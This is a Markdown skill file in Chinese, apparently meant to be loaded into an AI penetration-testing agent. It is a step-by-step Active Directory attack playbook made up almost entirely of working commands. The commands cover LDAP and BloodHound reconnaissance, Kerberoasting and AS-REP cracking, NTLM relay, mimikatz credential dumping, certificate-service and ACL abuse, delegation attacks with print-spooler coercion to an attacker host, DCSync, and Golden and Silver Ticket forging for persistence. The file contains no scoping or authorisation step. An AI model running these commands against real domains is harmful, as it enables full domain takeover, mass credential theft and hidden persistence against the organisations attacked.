---
name: ad-attack
description: Active Directory域渗透攻击
tags: ad, domain, kerberos, ldap, ntlm, dcsync, golden-ticket, silver-ticket, adcs, bloodhound, mimikatz, rubeus
priority: 75
phase: post-exploit
chain: recon -> exploit -> post-exploit -> intranet-pentest -> ad-attack
author: multi-agent-security-audit
---

# Active Directory 域渗透技能

## 阶段定义
在获取域内主机权限后，针对Windows Active Directory环境进行信息收集、权限提升、横向移动和域控接管。

## 攻击路径总览

```
域内立足点
├── 信息收集
│   ├── BloodHound → 攻击路径可视化
│   ├── LDAP查询 → 用户/组/GPO/ACL
│   └── SPN扫描 → Kerberoasting目标
├── 凭证获取
│   ├── Kerberoasting → 离线破解服务账号
│   ├── AS-REP Roasting → 无预认证账号
│   ├── NTLM Relay → 中继认证
│   └── mimikatz → 内存凭证提取
├── 权限提升
│   ├── ADCS攻击 → 证书服务滥用(ESC1-ESC8)
│   ├── ACL滥用 → WriteDACL/GenericAll
│   ├── GPO滥用 → 组策略劫持
│   └── 委派攻击 → 约束/非约束/RBCD
└── 域控接管
    ├── DCSync → 导出所有哈希
    ├── Golden Ticket → 伪造TGT
    ├── Silver Ticket → 伪造TGS
    └── DCShadow → 影子域控
```

## 信息收集

### BloodHound
```
# 数据采集
SharpHound.exe -c All --zipfilename output.zip
bloodhound-python -d domain.local -u user -p pass -ns DC_IP -c All

# 关键查询
- 到域管的最短路径
- Kerberoastable用户
- 有DCSync权限的用户
- 无约束委派的主机
```

### LDAP枚举
```
# 域用户枚举
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w pass -b "DC=domain,DC=local" "(objectClass=user)"

# SPN枚举(Kerberoasting目标)
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=*))"

# 域管组成员
ldapsearch -x -H ldap://DC_IP -b "CN=Domain Admins,CN=Users,DC=domain,DC=local"

# GPO枚举
ldapsearch -x -H ldap://DC_IP -b "CN=Policies,CN=System,DC=domain,DC=local"
```

### 基础信息
```
# 域信息
nltest /dclist:domain.local
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# 信任关系
nltest /domain_trusts
```

## 凭证获取

### Kerberoasting
```
# impacket
GetUserSPNs.py domain.local/user:pass -dc-ip DC_IP -request -outputfile hashes.txt

# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# hashcat破解
hashcat -m 13100 hashes.txt wordlist.txt
```

### AS-REP Roasting
```
# 查找无预认证账号
GetNPUsers.py domain.local/ -dc-ip DC_IP -usersfile users.txt -no-pass -outputfile asrep.txt

# hashcat破解
hashcat -m 18200 asrep.txt wordlist.txt
```

### NTLM Relay
```
# Responder监听
Responder.py -I eth0 -wrf

# ntlmrelayx中继到LDAP
ntlmrelayx.py -t ldap://DC_IP --escalate-user attacker

# ntlmrelayx中继到SMB
ntlmrelayx.py -t smb://TARGET_IP -smb2support
```

### mimikatz
```
# 提取内存凭证
privilege::debug
sekurlsa::logonpasswords

# 提取NTDS.dit(需域管)
lsadump::dcsync /domain:domain.local /user:Administrator

# 导出所有哈希
lsadump::dcsync /domain:domain.local /all /csv
```

## 权限提升

### ADCS攻击(证书服务)
```
# ESC1: 模板允许申请者指定SAN
certipy find -u user@domain.local -p pass -dc-ip DC_IP -vulnerable
certipy req -u user@domain.local -p pass -ca CA_NAME -template TEMPLATE -upn administrator@domain.local

# ESC8: Web Enrollment NTLM Relay
certipy relay -ca CA_IP
ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp --adcs --template Machine
```

### ACL滥用
```
# GenericAll → 重置密码
net rpc password "target_user" "newpass" -U "domain/attacker%pass" -S DC_IP

# WriteDACL → 授予DCSync权限
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync

# ForceChangePassword
rpcclient -U "attacker%pass" DC_IP -c "setuserinfo2 target_user 23 'NewPass123!'"
```

### 委派攻击
```
# 非约束委派 → 获取TGT
Rubeus.exe monitor /interval:5 /filteruser:DC$
# 触发打印机Bug
SpoolSample.exe DC_IP ATTACKER_IP

# 约束委派 → S4U2Self + S4U2Proxy
getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/svc_account:pass

# RBCD(基于资源的约束委派)
rbcd.py -delegate-to TARGET$ -delegate-from ATTACKER$ -dc-ip DC_IP domain.local/user:pass
getST.py -spn cifs/TARGET.domain.local -impersonate Administrator -dc-ip DC_IP domain.local/ATTACKER$:pass
```

## 域控接管

### DCSync
```
# impacket
secretsdump.py domain.local/admin:pass@DC_IP -just-dc-ntlm

# mimikatz
lsadump::dcsync /domain:domain.local /user:krbtgt
```

### Golden Ticket
```
# 需要krbtgt哈希
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt

# impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@DC_IP
```

### Silver Ticket
```
# 伪造CIFS服务票据
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:DC.domain.local /service:cifs /rc4:MACHINE_HASH /ptt
```

## Strategy

### 标准域渗透流程
1. BloodHound采集 → 分析攻击路径
2. Kerberoasting/AS-REP → 尝试获取可破解凭证
3. 检查ADCS → ESC1-ESC8漏洞
4. 检查ACL → GenericAll/WriteDACL等可利用权限
5. 检查委派 → 非约束/约束/RBCD
6. 横向移动 → Pass-the-Hash/Pass-the-Ticket
7. DCSync → 导出域内所有哈希
8. Golden Ticket → 持久化

### 工具链
| 工具 | 用途 |
|------|------|
| BloodHound/SharpHound | AD信息收集与攻击路径分析 |
| impacket | Python实现的Windows协议工具集 |
| Rubeus | Kerberos攻击工具 |
| mimikatz | 凭证提取 |
| certipy | ADCS攻击 |
| CrackMapExec | 批量横向移动 |
| Responder | LLMNR/NBT-NS投毒 |
| ntlmrelayx | NTLM中继 |

### 关键纪律
- 先BloodHound再动手，不要盲目横向
- Kerberoasting优先于暴力破解
- ADCS是当前最高效的提权路径
- DCSync前确认有足够权限(域管或被授予Replication权限)
- Golden Ticket的krbtgt哈希是最终目标
